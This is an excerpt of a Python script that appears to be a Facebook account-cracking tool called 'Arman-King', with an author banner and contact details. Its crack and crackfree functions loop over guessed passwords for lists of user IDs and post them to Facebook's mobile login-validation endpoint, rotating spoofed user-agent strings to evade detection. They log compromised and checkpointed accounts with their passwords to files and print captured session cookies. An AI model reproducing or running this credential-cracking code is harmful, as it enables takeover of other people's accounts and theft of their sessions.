...
#------------------[ Arman-King ]-------------------#
#------------------[ USER-AGENT ]-------------------#
ua = ["Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.57 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.57 Mobile Safari/537.36",]
...
ua = ["Mozilla/5.0 (Linux; Android 9; Redmi Note 6 Pro Build/PKQ1.180904.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.92 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/326.0.0.17.97",]
ua = ["Mozilla/5.0 (Linux; Android 9; Redmi Note 6 Pro Build/PKQ1.180904.001) AppleWebKit/537.36 (KHTML, like Gecko) VenusBrowser/3.2.33 Chrome/105.0.5195.136 Mobile Safari/537.36",]
...
def back():
    login()
def contact():
   # os.system('xdg-open https://www.facebook.com/CEO.Arman.Admin.Tremux.Group')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
...
'##:::. ##: ########:: ## ### ##:'##:::. ##: ## ## ##::::
 ...
 ##:::: ##: ##:::. ##: ##:::: ##: ##:::: ##: ##::. ##::::
..:::::..::..:::::..::..:::::..::..:::::..::..::::..:::::
\033[0;93m╠══[Author:=======================> \33[1;38mMR. ARMAN\33[1;38m       ║\033[1;31m
╠══[Facebook:=====================> MD ARMAN HOSSAIN       ║  \033[1;97m
╠══[Github:=======================> \33[1;38mArmanking2023      ║\33[1;34m
╠══[Whatsapp:=====================> 013188058**     ║\33[1;35m
...
os.system('espeak -a 300 " Welcome,   to,  Arman ,  King,  Tools"')
pass
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[Arman •M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;94m[Arman -Cp] {idf} • {pw}')
                ...
                print(f'\r\033[0;92m[Arman -Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
                os.system('espeak -a 300 " Arman ,  Ok,  id"')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[Arman -M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•Arman -Cp] {idf} • {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•Arman -Ok] {idf} • {pw} ')
                os.system('espeak -a 300 " Ok,  Arman ,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
